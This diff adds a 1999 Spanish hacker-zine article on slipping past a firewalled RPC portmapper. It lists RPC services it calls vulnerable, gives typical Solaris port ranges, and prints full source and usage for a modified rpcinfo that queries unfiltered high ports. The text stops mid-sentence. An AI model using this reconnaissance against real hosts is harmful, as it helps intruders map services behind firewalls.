@@ -1,0 +1,1310 @@
+-[ 0x08 ]--------------------------------------------------------------------
+-[ Evasion RPC ]-------------------------------------------------------------
+-[ by Dark Raver ]----------------------------------------------------SET-23-
+
+
+ Como Evitar Un Portmap Firewalleado [version re-ampliada]
+===========================================================
+		    			The Dark Raver (23/12/99)
+
+
+
+** NOTA ** Despues de varias revisiones, debido al rapido avance de las
+herramientas que ayudan al estudio de los servicios RPC (especialmente al 
+nmap) creo que por fin el texto esta actualizado y puede ser publicado.
+
+
+Escenario
+~~~~~~~~~
+
+Con el aumento del numero de hacker-kiddies (ni~os hacker) y el crecimiento
+del gasto en seguridad por parte de las organizaciones que se deciden a poner
+sus maquinas en internet, las anta~o miticas firewall (paredes de fuego! wow!)
+se han convertido en algo habitual.
+
+Ahora muchos administradores ya ni se molestan en parchear los agujeros de
+seguridad de sus maquinas, simplemente ponen un firewall lo mas tocho posible
+delante de sus ordenadores, y se dedican a tradear warez...
+
+Esto por una parte hace mas dificil la labor de los hackers, pero si por
+alguna razon un hacker consigue sobrepasar los controles del firewall, una
+vez dentro le sera relativamente facil conseguir control sobre la maquina.
+
+Este articulo se centra en unas peque~as y sencillas tecnicas para evitar el
+filtro que algunos administradores realizan sobre su puerto 111, es decir
+el puerto de portamp, el demonio que se encarga de informarnos sobre que
+servicios RPC tiene activos la maquina. 
+
+
+Vulnerabilidades de servicios RPC
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Tradicionalmente los servicios RPC han sido residencia de numerosos bugs y
+problemas de seguridad. Incluso en sistemas como linux, donde el codigo fuente
+es publico, hasta hace poco tiempo no se ha conseguido limpiar de bugs estos 
+servicios.
+
+Por eso averiguar que servicios RPC tiene activos una maquina y en que puertos
+se encuentran, es muy importante, a pesar de que un firewall nos impida 
+verlos.
+
+Tendremos que que actuar a ciegas, tanteando el terreno hasta encontrar lo que
+buscabamos, pero una vez que lo encontremos el trabajo sera igual de facil que
+siempre.
+
+La efectividad de esta tecnica se basa en que normalmente los firewalls
+no filtran todos los puertos o todos los protocolos de la maquina: 
+
+- Algunos firewalls por defecto se limitan a evitar el acceso a los puertos 
+privilegiados (Aquellos por debajo del 1024) 
+
+- Tambien es normal encontrar firewalls que solo filtran paquetes de algun
+tipo en concreto, por ejemplo filtrar tcp dejando pasar el resto: udp, icmp, 
+igmp, etc...
+
+- Muchos administradores configuran sus firewalls para cubrir los puertos de
+servicios que tradicionalmente han sido vulnerables, como los puertos 21,
+110, 23, 143 y por supuesto el 111, pero no se les ocurre tapar un puerto
+como el 32771 (Que webos puede ser vulnerable en ese puerto?! ;)
+
+- Los servicios RPC distribuyen mas o menos arbitrariamente los puertos 
+en los que se situa cada servicio. Una administrador puede cubrir con un 
+firewall todos sus puertos activos, pero luego, una peque~a modificacion de 
+la configuracion puede alterar la distribucion de puertos sin que el 
+administrador se entere y reconfigure el firewall al efecto.
+
+Todas estas razones hacen muy utiles estas tecnicas, aunque no garantizan su
+efectividad en todos los casos.
+
+Aqui teneis una peque~a lista, no demasiado exhaustiva, de los servicios RPC
+vulnerables en distintos sistemas operativos:
+
+Linux:
+-mountd
+-nfs
+-status
+-amd
+-autofsd
+
+Sun/Solaris: => Sin duda los RPC son el punto vulnerable de los sun
+-mountd 
+-nfs
+-status/statd 
+-ttdbserver
+-cmsd
+-nisd
+-nlockmgr
+-sadmind
+
+Irix:
+-ttdbserver
+-autofsd
+
+Hp/ux:
+-ttdbserver
+
+Sco/Unixware:
+-ttdbserver
+-mount
+
+BSD: (FreeBSD, OpenBSD, etc...)
+-amd
+-autofsd
+
+Sin olvidarnos de los servicios RPC vulnerables por si mismos:
+-rexd
+-pcnfsd
+-ypserv => yellow pages
+-mountd exportando a todo el mundo
+-etc...
+
+Estos son todos los que recuerdo asi de primeras, pero seguramente haya 
+algunos mas. Es cuestion de investigar un poco.
+
+
+Aumentando nuestra informacion
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Antes de empezar a trabajar con un portmap firewalleado, vamos a ver unos
+cuantos trucos para obtener mas informacion de los servicios RPC tanto cuando
+se encuentrer tras un firewall o no.
+
+La herramienta basica sera la orden rpcinfo (/usr/sbin/rpcinfo en linux)
+
+-------------------------------------------------
+$ rpcinfo
+Usage: rpcinfo [ -n portnum ] -u host prognum [ versnum ]
+       rpcinfo [ -n portnum ] -t host prognum [ versnum ]
+       rpcinfo -p [ host ]
+       rpcinfo -b prognum versnum
+       rpcinfo -d prognum versnum
+-------------------------------------------------
+
+Es una herramienta simple, pero muy potente. Echarle un vistazo al manual de
+este comando antes de empezar a jugar con el.
+
+-------------------------------------------------
+$ rpcinfo -p 1.1.1.1
+   program vers proto   port
+    100000    2   tcp    111  rpcbind
+    100000    2   udp    111  rpcbind
+    100024    1   udp    846  status
+    100024    1   tcp    848  status
+    100011    1   udp    868  rquotad
+    100011    2   udp    868  rquotad
+    100005    1   udp    879  mountd
+    100005    1   tcp    881  mountd
+    100005    2   udp    884  mountd
+    100005    2   tcp    886  mountd
+    100005    3   udp    889  mountd
+    100005    3   tcp    891  mountd
+    100003    2   udp   2049  nfs
+    100021    1   udp   1024  nlockmgr
+    100021    3   udp   1024  nlockmgr
+    100021    1   tcp   1024  nlockmgr
+    100021    3   tcp   1024  nlockmgr
+1092830567    2   udp   3049  cfs
+-------------------------------------------------
+
+Espero que como buenos unixeros/linuxeros sepais interpretar esta informacion,
+si no os queda mucho por aprender.
+
+Hay 2 puntos muy importantes:
+
+El program/prognum -> Es lo que aparece a la derecha. Es una cifra que 
+identifica el tipo de servicio. Esta cifra es fija y constante para todos
+los sistemas operativos.
+
+La tabla de equivalencias la tendreis normalmente en un archivo similar al
+/etc/services, pero destinado solo a los rpc => /etc/rpc
+
+<++> rpc/rpc.services
+#ident	"@(#)rpc	1.11	95/07/14 SMI"	/* SVr4.0 1.2	*/
+#
+#	rpc
+#
+rpcbind		100000	portmap sunrpc rpcbind
+rstatd		100001	rstat rup perfmeter
+rusersd		100002	rusers
+nfs		100003	nfsprog
+ypserv		100004	ypprog
+mountd		100005	mount showmount
+ypbind		100007
+walld		100008	rwall shutdown
+yppasswdd	100009	yppasswd
+etherstatd	100010	etherstat
+rquotad		100011	rquotaprog quota rquota
+sprayd		100012	spray
+3270_mapper	100013
+rje_mapper	100014
+selection_svc	100015	selnsvc
+database_svc	100016
+rexd		100017	rex
+alis		100018
+sched		100019
+llockmgr	100020
+nlockmgr	100021
+x25.inr		100022
+statmon		100023
+status		100024
+ypupdated	100028	ypupdate
+keyserv		100029	keyserver
+bootparam	100026
+sunlink_mapper	100033
+tfsd		100037
+nsed		100038
+nsemntd		100039
+showfhd		100043	showfh
+ioadmd		100055	rpc.ioadmd
+NETlicense	100062
+sunisamd	100065
+debug_svc 	100066  dbsrv
+cmsd            100068
+ypxfrd		100069  rpc.ypxfrd
+bugtraqd	100071
+kerbd		100078
+ttdbserver      100083  tooltalk // rpc.ttdbserver
+autofs          100099
+event		100101	na.event	# SunNet Manager
+logger		100102	na.logger	# SunNet Manager
+sync		100104	na.sync
+hostperf	100107	na.hostperf
+activity	100109	na.activity	# SunNet Manager
+hostmem		100112	na.hostmem
+sample		100113	na.sample
+x25		100114	na.x25
+ping		100115	na.ping
+rpcnfs		100116	na.rpcnfs
+hostif		100117	na.hostif
+etherif		100118	na.etherif
+iproutes	100120	na.iproutes
+layers		100121	na.layers
+snmp		100122	na.snmp snmp-cmc snmp-synoptics snmp-unisys snmp-utk
+traffic		100123	na.traffic
+nfs_acl		100227
+sadmind		100232
+nisd		100300	rpc.nisd
+nispasswd	100303	rpc.nispasswdd
+ufsd		100233	ufsd
+pcnfsd		150001
+amd		300019  amq
+cfs		1092830567
+bwnfsd		545580417
+fypxfrd		600100069 freebsd-ypxfrd
+<-->
+
+Este es el /etc/rpc estandar obtenido de un linux (redhat) ligeramente
+modificado.
+
+He a~adido las siguientes lineas que no aparecian:
+100083 -> tooltalk // ttdbserver
+1092830567 -> cfs
+100099 -> autofs
+100300 -> nisd
+100068 -> cmsd
+
+Esto es muy importante, ya que si estas lineas no estuviesen el resultado 
+obtenido al hacer un rpcinfo -p 1.1.1.1 seria:
+
+-------------------------------------------------
+[...]
+    100021    1   tcp   1024  nlockmgr
+    100021    3   tcp   1024  nlockmgr
+1092830567    2   udp   3049  
+-------------------------------------------------
+
+Como veis, ahora no vemos el nombre del RPC. Y si no supiesemos que 1092830567
+corresponde al servicio cfs, pasariamos por alto esta informacion.
+
+El segundo punto importante es el puerto/port -> Nos indica el puerto en el
+que se encuentra cada servicio (tcp o udp)
+
+Ya he dicho antes que la distribucion de los puertos no es fija, siendo
+relativamente aleatoria, sin embargo siempre hay una tendencia para cada
+sistema operativo, y ante configuraciones similares la distribucion es la
+misma.
+
+Por ejemplo, despues de realizar rpcinfo -p contra varios solaris el resultado
+es el siguiente, si el servicio que buscamos es el ttdbserver:
+
+-------------------------------------------------
+    100083    1   tcp  32775  ttdbserver
+    100083    1   tcp  32774  ttdbserver
+    100083    1   tcp  32775  ttdbserver
+    100083    1   tcp  32775  ttdbserver
+    100083    1   tcp  32775  ttdbserver
+    100083    1   tcp  32787  ttdbserver
+    100083    1   tcp  32773  ttdbserver
+    100083    1   tcp  32775  ttdbserver
+-------------------------------------------------
+
+Como veis la tendencia es bastante clara, el puerto siempre esta en el rango
+327xx, siendo 32775 el valor mas habitual. A la hora de buscar este servicio
+en una maquina sun ya sabemos por donde empezar.
+
+Esto nos servira luego de guia a la hora de intentar adivinar el puerto donde
+reside un determinado servicio. Por supuesto la experiencia jugara mucho a
+nuestro favor a la hora de atinar en nuestras predicciones.
+
+Otro truco bastante util a la hora de tratar con maquinas sun, (Sobre todo
+solaris 2.5, 2.5.1 y 2.6) es que normalmente tienen el portmapper activo en
+un puerto alto. (ademas del 111) Este puerto normalmente es el 32770 o el
+32771 y en la mayoria de los casos se encuentra sin firewallear.
+
+Solo necesitamos una version de rpcinfo que nos permita consultar otros
+puertos ademas del 111. Por suerte jwa se encargo de hacerlo hace un par de
+a~os, asi que no tendremos que molestarnos en aprender a programar ;)
+
+<++> rpc/h_rpcinfo.c
+/*
+ * Copyright (C) 1986, Sun Microsystems, Inc.
+ */
+
+/*
+ * rpcinfo: ping a particular rpc program
+ *     or dump the portmapper
+ */
+
+/*
+ * 15 Jul 1997 jwa@jammed.com
+ *  hacked to support the global use of the -n flag (set dst port)
+ *  and to perform PMAPDUMPs over UDP
+ *
+ * usage: ./h_rpcinfo -n 32771 -p hostname
+ *
+ * Tested under Linux 2.0/gcc.  YMMV.
+ */
+
+/*
+ * Sun RPC is a product of Sun Microsystems, Inc. and is provided for
+ * unrestricted use provided that this legend is included on all tape
+ * media and as a part of the software program in whole or part.  Users
+ * may copy or modify Sun RPC without charge, but are not authorized
+ * to license or distribute it to anyone else except as part of a product or
+ * program developed by the user.
+ * 
+ * SUN RPC IS PROVIDED AS IS WITH NO WARRANTIES OF ANY KIND INCLUDING THE
+ * WARRANTIES OF DESIGN, MERCHANTIBILITY AND FITNESS FOR A PARTICULAR
+ * PURPOSE, OR ARISING FROM A COURSE OF DEALING, USAGE OR TRADE PRACTICE.
+ * 
+ * Sun RPC is provided with no support and without any obligation on the
+ * part of Sun Microsystems, Inc. to assist in its use, correction,
+ * modification or enhancement.
+ * 
+ * SUN MICROSYSTEMS, INC. SHALL HAVE NO LIABILITY WITH RESPECT TO THE
+ * INFRINGEMENT OF COPYRIGHTS, TRADE SECRETS OR ANY PATENTS BY SUN RPC
+ * OR ANY PART THEREOF.
+ * 
+ * In no event will Sun Microsystems, Inc. be liable for any lost revenue
+ * or profits or other special, indirect and consequential damages, even if
+ * Sun has been advised of the possibility of such damages.
+ * 
+ * Sun Microsystems, Inc.
+ * 2550 Garcia Avenue
+ * Mountain View, California  94043
+ */
+
+/*
+ * From: @(#)rpcinfo.c 1.22 87/08/12 SMI
+ * From: @(#)rpcinfo.c	2.2 88/08/11 4.0 RPCSRC
+ */
+char rcsid[] = 
+  "$Id: rpcinfo.c,v 1.4 1996/08/15 03:04:48 dholland Exp $";
+
+#include <stdio.h>
+#include <netdb.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <rpc/rpc.h>
+#include <rpc/pmap_prot.h>
+#include <rpc/pmap_clnt.h>
+#include <signal.h>
+#include <ctype.h>
+#include <netinet/in.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+
+#define MAXHOSTLEN 256
+
+#define	MIN_VERS	((u_long) 0)
+#define	MAX_VERS	((u_long) 4294967295UL)
+
+u_short g_portnum;
+
+static void	udpping(u_short portflag, int argc, char **argv);
+static void	tcpping(u_short portflag, int argc, char **argv);
+static int	pstatus(CLIENT *client, u_long prognum, u_long vers);
+static void	pmapdump(int argc, char **argv);
+static bool_t	reply_proc(void *res, struct sockaddr_in *who);
+static void	brdcst(int argc, char **argv);
+static void	deletereg(int argc, char **argv);
+static void	usage(void);
+static u_long	getprognum(char *arg);
+static u_long	getvers(char *arg);
+static void	get_inet_address(struct sockaddr_in *addr, char *host);
+
+/*
+ * Functions to be performed.
+ */
+#define	NONE		0	/* no function */
+#define	PMAPDUMP	1	/* dump portmapper registrations */
+#define	TCPPING		2	/* ping TCP service */
+#define	UDPPING		3	/* ping UDP service */
+#define	BRDCST		4	/* ping broadcast UDP service */
+#define DELETES		5	/* delete registration for the service */
+
+int
+main(int argc, char **argv)
+{
+	register int c;
+	int errflg;
+	int function;
+	u_short portnum;
+
+	function = NONE;
+	portnum = 0;
+	errflg = 0;
+	while ((c = getopt(argc, argv, "ptubdn:")) != EOF) {
+		switch (c) {
+
+		case 'p':		/* force it */
+			/* if (function != NONE)
+				errflg = 1;
+			else */ errflg = 0;
+				function = PMAPDUMP;
+			break;
+
+		case 't':
+			if (function != NONE)
+				errflg = 1;
+			else
+				function = TCPPING;
+			break;
+
+		case 'u':
+			if (function != NONE)
+				errflg = 1;
+			else
+				function = UDPPING;
+			break;
+
+		case 'b':
+			if (function != NONE)
+				errflg = 1;
+			else
+				function = BRDCST;
+			break;
+
+		case 'n':
+			/* hope we don't get bogus # */
+			portnum = (u_short) atoi(optarg);   
+			g_portnum = (u_short) atoi(optarg);   
+			break;
+
+		case 'd':
+			if (function != NONE)
+				errflg = 1;
+			else
+				function = DELETES;
+			break;
+
+		case '?':
+			errflg = 1;
+		}
+	}
+
+	if ((errflg || function == NONE) && (g_portnum == 0)) {
+		usage();
+		return (1);
+	}
+
+	switch (function) {
+
+	case PMAPDUMP:
+		/* avoid silly portchecking stuff */
+		/* if (portnum != 0) {
+			usage();
+			return (1);
+		} */
+		pmapdump(argc - optind, argv + optind);
+		break;
+
+	case UDPPING:
+		udpping(portnum, argc - optind, argv + optind);
+		break;
+
+	case TCPPING:
+		tcpping(portnum, argc - optind, argv + optind);
+		break;
+
+	case BRDCST:
+		if (portnum != 0) {
+			usage();
+			return (1);
+		}
+		brdcst(argc - optind, argv + optind);
+		break;
+
+	case DELETES:
+		deletereg(argc - optind, argv + optind);
+		break;
+	}
+
+	return (0);
+}
+		
+static void
+udpping(u_short portnum, int argc, char **argv)
+{
+	struct timeval to;
+	struct sockaddr_in addr;
+	enum clnt_stat rpc_stat;
+	CLIENT *client;
+	u_long prognum, vers, minvers, maxvers;
+	int sock = RPC_ANYSOCK;
+	struct rpc_err rpcerr;
+	int failure;
+    
+	if (argc < 2 || argc > 3) {
+		usage();
+		exit(1);
+	}
+
+	prognum = getprognum(argv[1]);
+	get_inet_address(&addr, argv[0]);
+	/* Open the socket here so it will survive calls to clnt_destroy */
+	sock = socket( AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+	if (sock < 0) {
+		perror("rpcinfo: socket");
+		exit(1);
+	}
+	failure = 0;
+	if (argc == 2) {
+		printf("trying version %d\n", vers);
+		/*
+		 * A call to version 0 should fail with a program/version
+		 * mismatch, and give us the range of versions supported.
+		 */
+		addr.sin_port = htons(portnum);
+		to.tv_sec = 5;
+		to.tv_usec = 0;
+		if ((client = clntudp_create(&addr, prognum, (u_long)0,
+		    to, &sock)) == NULL) {
+			clnt_pcreateerror("rpcinfo");
+			printf("program %lu is not available\n",
+			    prognum);
+			exit(1);
+		}
+		to.tv_sec = 10;
+		to.tv_usec = 0;
+		rpc_stat = clnt_call(client, NULLPROC, 
+				     (xdrproc_t) xdr_void, NULL,
+				     (xdrproc_t) xdr_void, NULL, to);
+		if (rpc_stat == RPC_PROGVERSMISMATCH) {
+			clnt_geterr(client, &rpcerr);
+			minvers = rpcerr.re_vers.low;
+			maxvers = rpcerr.re_vers.high;
+		} else if (rpc_stat == RPC_SUCCESS) {
+			/*
+			 * Oh dear, it DOES support version 0.
+			 * Let's try version MAX_VERS.
+			 */
+			addr.sin_port = htons(portnum);
+			to.tv_sec = 5;
+			to.tv_usec = 0;
+			if ((client = clntudp_create(&addr, prognum, MAX_VERS,
+			    to, &sock)) == NULL) {
+				clnt_pcreateerror("rpcinfo");
+				printf("program %lu version %lu is not available\n",
+				    prognum, MAX_VERS);
+				exit(1);
+			}
+			to.tv_sec = 10;
+			to.tv_usec = 0;
+			rpc_stat = clnt_call(client, NULLPROC, 
+					     (xdrproc_t) xdr_void, NULL, 
+					     (xdrproc_t) xdr_void, NULL, to);
+			if (rpc_stat == RPC_PROGVERSMISMATCH) {
+				clnt_geterr(client, &rpcerr);
+				minvers = rpcerr.re_vers.low;
+				maxvers = rpcerr.re_vers.high;
+			} else if (rpc_stat == RPC_SUCCESS) {
+				/*
+				 * It also supports version MAX_VERS.
+				 * Looks like we have a wise guy.
+				 * OK, we give them information on all
+				 * 4 billion versions they support...
+				 */
+				minvers = 0;
+				maxvers = MAX_VERS;
+			} else {
+				(void) pstatus(client, prognum, MAX_VERS);
+				exit(1);
+			}
+		} else {
+			(void) pstatus(client, prognum, (u_long)0);
+			exit(1);
+		}
+		clnt_destroy(client);
+		for (vers = minvers; vers <= maxvers; vers++) {
+			addr.sin_port = htons(portnum);
+			to.tv_sec = 5;
+			to.tv_usec = 0;
+			if ((client = clntudp_create(&addr, prognum, vers,
+			    to, &sock)) == NULL) {
+				clnt_pcreateerror("rpcinfo");
+				printf("program %lu version %lu is not available\n",
+				    prognum, vers);
+				exit(1);
+			}
+			to.tv_sec = 10;
+			to.tv_usec = 0;
+			rpc_stat = clnt_call(client, NULLPROC, 
+					     (xdrproc_t) xdr_void, NULL, 
+					     (xdrproc_t) xdr_void, NULL, to);
+			if (pstatus(client, prognum, vers) < 0)
+				failure = 1;
+			clnt_destroy(client);
+		}
+	}
+	else {
+		vers = getvers(argv[2]);
+		addr.sin_port = htons(portnum);
+		to.tv_sec = 5;
+		to.tv_usec = 0;
+		if ((client = clntudp_create(&addr, prognum, vers,
+		    to, &sock)) == NULL) {
+			clnt_pcreateerror("rpcinfo");
+			printf("program %lu version %lu is not available\n",
+			    prognum, vers);
+			exit(1);
+		}
+		to.tv_sec = 10;
+		to.tv_usec = 0;
+		rpc_stat = clnt_call(client, 0, 
+				     (xdrproc_t) xdr_void, NULL,
+				     (xdrproc_t) xdr_void, NULL, to);
+		if (pstatus(client, prognum, vers) < 0)
+			failure = 1;
+	}
+	(void) close(sock); /* Close it up again */
+	if (failure)
+		exit(1);
+}
+
+static void
+tcpping(u_short portnum, int argc, char **argv)
+{
+	struct timeval to;
+	struct sockaddr_in addr;
+	enum clnt_stat rpc_stat;
+	CLIENT *client;
+	u_long prognum, vers, minvers, maxvers;
+	int sock = RPC_ANYSOCK;
+	struct rpc_err rpcerr;
+	int failure;
+
+	if (argc < 2 || argc > 3) {
+		usage();
+		exit(1);
+	}
+	prognum = getprognum(argv[1]);
+	get_inet_address(&addr, argv[0]);
+	failure = 0;
+	if (argc == 2) {
+		/*
+		 * A call to version 0 should fail with a program/version
+		 * mismatch, and give us the range of versions supported.
+		 */
+		addr.sin_port = htons(portnum);
+		if ((client = clnttcp_create(&addr, prognum, MIN_VERS,
+		    &sock, 0, 0)) == NULL) {
+			clnt_pcreateerror("rpcinfo");
+			printf("program %lu is not available\n",
+			    prognum);
+			exit(1);
+		}
+		to.tv_sec = 10;
+		to.tv_usec = 0;
+		rpc_stat = clnt_call(client, NULLPROC, 
+				     (xdrproc_t) xdr_void, NULL,
+				     (xdrproc_t) xdr_void, NULL, to);
+		if (rpc_stat == RPC_PROGVERSMISMATCH) {
+			clnt_geterr(client, &rpcerr);
+			minvers = rpcerr.re_vers.low;
+			maxvers = rpcerr.re_vers.high;
+		} else if (rpc_stat == RPC_SUCCESS) {
+			/*
+			 * Oh dear, it DOES support version 0.
+			 * Let's try version MAX_VERS.
+			 */
+			addr.sin_port = htons(portnum);
+			if ((client = clnttcp_create(&addr, prognum, MAX_VERS,
+			    &sock, 0, 0)) == NULL) {
+				clnt_pcreateerror("rpcinfo");
+				printf("program %lu version %lu is not available\n",
+				    prognum, MAX_VERS);
+				exit(1);
+			}
+			to.tv_sec = 10;
+			to.tv_usec = 0;
+			rpc_stat = clnt_call(client, NULLPROC, 
+					     (xdrproc_t) xdr_void, NULL, 
+					     (xdrproc_t) xdr_void, NULL, to);
+			if (rpc_stat == RPC_PROGVERSMISMATCH) {
+				clnt_geterr(client, &rpcerr);
+				minvers = rpcerr.re_vers.low;
+				maxvers = rpcerr.re_vers.high;
+			} else if (rpc_stat == RPC_SUCCESS) {
+				/*
+				 * It also supports version MAX_VERS.
+				 * Looks like we have a wise guy.
+				 * OK, we give them information on all
+				 * 4 billion versions they support...
+				 */
+				minvers = 0;
+				maxvers = MAX_VERS;
+			} else {
+				(void) pstatus(client, prognum, MAX_VERS);
+				exit(1);
+			}
+		} else {
+			(void) pstatus(client, prognum, MIN_VERS);
+			exit(1);
+		}
+		clnt_destroy(client);
+		(void) close(sock);
+		sock = RPC_ANYSOCK; /* Re-initialize it for later */
+		for (vers = minvers; vers <= maxvers; vers++) {
+			addr.sin_port = htons(portnum);
+			if ((client = clnttcp_create(&addr, prognum, vers,
+			    &sock, 0, 0)) == NULL) {
+				clnt_pcreateerror("rpcinfo");
+				printf("program %lu version %lu is not available\n",
+				    prognum, vers);
+				exit(1);
+			}
+			to.tv_usec = 0;
+			to.tv_sec = 10;
+			rpc_stat = clnt_call(client, 0, 
+					     (xdrproc_t) xdr_void, NULL,
+					     (xdrproc_t) xdr_void, NULL, to);
+			if (pstatus(client, prognum, vers) < 0)
+				failure = 1;
+			clnt_destroy(client);
+			(void) close(sock);
+			sock = RPC_ANYSOCK;
+		}
+	}
+	else {
+		vers = getvers(argv[2]);
+		addr.sin_port = htons(portnum);
+		if ((client = clnttcp_create(&addr, prognum, vers, &sock,
+		    0, 0)) == NULL) {
+			clnt_pcreateerror("rpcinfo");
+			printf("program %lu version %lu is not available\n",
+			    prognum, vers);
+			exit(1);
+		}
+		to.tv_usec = 0;
+		to.tv_sec = 10;
+		rpc_stat = clnt_call(client, 0, 
+				     (xdrproc_t) xdr_void, NULL,
+				     (xdrproc_t) xdr_void, NULL, to);
+		if (pstatus(client, prognum, vers) < 0)
+			failure = 1;
+	}
+	if (failure)
+		exit(1);
+}
+
+/*
+ * This routine should take a pointer to an "rpc_err" structure, rather than
+ * a pointer to a CLIENT structure, but "clnt_perror" takes a pointer to
+ * a CLIENT structure rather than a pointer to an "rpc_err" structure.
+ * As such, we have to keep the CLIENT structure around in order to print
+ * a good error message.
+ */
+static int
+pstatus(CLIENT *client, u_long prognum, u_long vers)
+{
+	struct rpc_err rpcerr;
+
+	clnt_geterr(client, &rpcerr);
+	if (rpcerr.re_status != RPC_SUCCESS) {
+		clnt_perror(client, "rpcinfo");
+		printf("program %lu version %lu is not available\n",
+		    prognum, vers);
+		return (-1);
+	} else {
+		printf("program %lu version %lu ready and waiting\n",
+		    prognum, vers);
+		return (0);
+	}
+}
+
+static void
+pmapdump(int argc, char **argv)
+{
+	struct sockaddr_in server_addr;
+	struct pmaplist *head = NULL;
+	int sockett = RPC_ANYSOCK;
+	struct timeval minutetimeout;
+	register CLIENT *client;
+	struct rpcent *rpc;
+
+	struct timeval to;
+
+	if (argc > 1) {
+		usage();
+		exit(1);
+	}
+	if (argc == 1)
+		get_inet_address(&server_addr, argv[0]);
+	else {
+		bzero((char *)&server_addr, sizeof server_addr);
+		server_addr.sin_family = AF_INET;
+		server_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+	}
+	minutetimeout.tv_sec = 60;
+	minutetimeout.tv_usec = 0;
+
+	/* we provide it with a port number */
+	/* server_addr.sin_port = htons(PMAPPORT);*/  
+
+	if (!g_portnum) {
+         server_addr.sin_port = htons(PMAPPORT);
+        } else {
+ 	 printf("Using special port %d\n", g_portnum);
+         server_addr.sin_port = htons(g_portnum);
+        } 
+
+        /* don't use TCP; 32771 is only listening on UDP */
+
+	/* if ((client = clnttcp_create(&server_addr, PMAPPROG,
+				     PMAPVERS, &sockett, 50, 500)) == NULL) */
+
+        to.tv_sec = 5;
+        to.tv_usec = 0;
+
+	/* version 2 portmapper */
+
+	if ((client = clntudp_create(&server_addr, PMAPPROG,
+				     (u_long)2, to, &sockett)) == NULL) 
+        {
+		clnt_pcreateerror("rpcinfo: can't contact portmapper");
+		exit(1);
+	}
+
+	if (clnt_call(client, PMAPPROC_DUMP, 
+		      (xdrproc_t) xdr_void, NULL,
+		      (xdrproc_t) xdr_pmaplist, 
+		      &head, minutetimeout) != RPC_SUCCESS) 
+	{
+		fprintf(stderr, "rpcinfo: can't contact portmapper: ");
+		clnt_perror(client, "rpcinfo");
+		exit(1);
+	}
+	if (head == NULL) {
+		printf("No remote programs registered.\n");
+	} else {
+		printf("   program vers proto   port\n");
+		for (; head != NULL; head = head->pml_next) {
+			printf("%10ld%5ld",
+			    head->pml_map.pm_prog,
+			    head->pml_map.pm_vers);
+			if (head->pml_map.pm_prot == IPPROTO_UDP)
+				printf("%6s",  "udp");
+			else if (head->pml_map.pm_prot == IPPROTO_TCP)
+				printf("%6s", "tcp");
+			else
+				printf("%6ld",  head->pml_map.pm_prot);
+			printf("%7ld",  head->pml_map.pm_port);
+			rpc = getrpcbynumber(head->pml_map.pm_prog);
+			if (rpc)
+				printf("  %s\n", rpc->r_name);
+			else
+				printf("\n");
+		}
+	}
+}
+
+/* 
+ * reply_proc collects replies from the broadcast. 
+ * to get a unique list of responses the output of rpcinfo should
+ * be piped through sort(1) and then uniq(1).
+ */
+
+/* res: Nothing comes back */
+/* who: Who sent us the reply */
+static bool_t
+reply_proc(void *res, struct sockaddr_in *who)
+{
+	register struct hostent *hp;
+	(void)res;
+
+	hp = gethostbyaddr((char *) &who->sin_addr, sizeof(who->sin_addr),
+			   AF_INET);
+	printf("%s %s\n", inet_ntoa(who->sin_addr),
+	       (hp == NULL) ? "(unknown)" : hp->h_name);
+	return FALSE;
+}
+
+static void
+brdcst(int argc, char **argv)
+{
+	enum clnt_stat rpc_stat;
+	u_long prognum, vers;
+
+	if (argc != 2) {
+		usage();
+		exit(1);
+	}
+	prognum = getprognum(argv[0]);
+	vers = getvers(argv[1]);
+	rpc_stat = clnt_broadcast(prognum, vers, NULLPROC, 
+				  (xdrproc_t) xdr_void, NULL, 
+				  (xdrproc_t) xdr_void, NULL, 
+				  (resultproc_t) reply_proc);
+	if ((rpc_stat != RPC_SUCCESS) && (rpc_stat != RPC_TIMEDOUT)) {
+		fprintf(stderr, "rpcinfo: broadcast failed: %s\n",
+		    clnt_sperrno(rpc_stat));
+		exit(1);
+	}
+	exit(0);
+}
+
+static void
+deletereg(int argc, char **argv)
+{	
+	u_long prog_num, version_num;
+
+	if (argc != 2) {
+		usage() ;
+		exit(1) ;
+	}
+	if (getuid()) { /* This command allowed only to root */
+		fprintf(stderr, "Sorry. You are not root\n") ;
+		exit(1) ;
+	}
+	prog_num = getprognum(argv[0]);
+	version_num = getvers(argv[1]);
+	if ((pmap_unset(prog_num, version_num)) == 0) {
+		fprintf(stderr, "rpcinfo: Could not delete registration for prog %s version %s\n",
+			argv[0], argv[1]) ;
+		exit(1) ;
+	}
+}
+
+static void
+usage(void)
+{
+	fprintf(stderr, "Usage: rpcinfo [ -n portnum ] -u host prognum [ versnum ]\n");
+	fprintf(stderr, "       rpcinfo [ -n portnum ] -t host prognum [ versnum ]\n");
+	fprintf(stderr, "       rpcinfo -p [ host ]\n");
+	fprintf(stderr, "       rpcinfo -b prognum versnum\n");
+	fprintf(stderr, "       rpcinfo -d prognum versnum\n") ;
+}
+
+static u_long
+getprognum(char *arg)
+{
+	register struct rpcent *rpc;
+	register u_long prognum;
+
+	if (isalpha(*arg)) {
+		rpc = getrpcbyname(arg);
+		if (rpc == NULL) {
+			fprintf(stderr, "rpcinfo: %s is unknown service\n",
+			    arg);
+			exit(1);
+		}
+		prognum = rpc->r_number;
+	} else {
+		prognum = (u_long) atoi(arg);
+	}
+
+	return (prognum);
+}
+
+static u_long
+getvers(char *arg)
+{
+	register u_long vers;
+
+	vers = (int) atoi(arg);
+	return (vers);
+}
+
+static void
+get_inet_address(struct sockaddr_in *addr, char *host)
+{
+	register struct hostent *hp;
+
+	bzero((char *)addr, sizeof *addr);
+	addr->sin_addr.s_addr = (u_long) inet_addr(host);
+	if (addr->sin_addr.s_addr == (unsigned long)-1 || 
+	    addr->sin_addr.s_addr == 0) 
+	{
+		if ((hp = gethostbyname(host)) == NULL) {
+			fprintf(stderr, "rpcinfo: %s is unknown host\n", host);
+			exit(1);
+		}
+		bcopy(hp->h_addr, (char *)&addr->sin_addr, hp->h_length);
+	}
+	addr->sin_family = AF_INET;
+}
+<-->
+
+Debe compilar sin problemas en linux de la siguiente forma:
+
+$ cc h_rpcinfo.c -o h_rpcinfo
+
+Y la forma de usarlo:
+
+$ h_rpcinfo -n 32771 -p hostname
+
+
+Como sabemos que hay un firewall
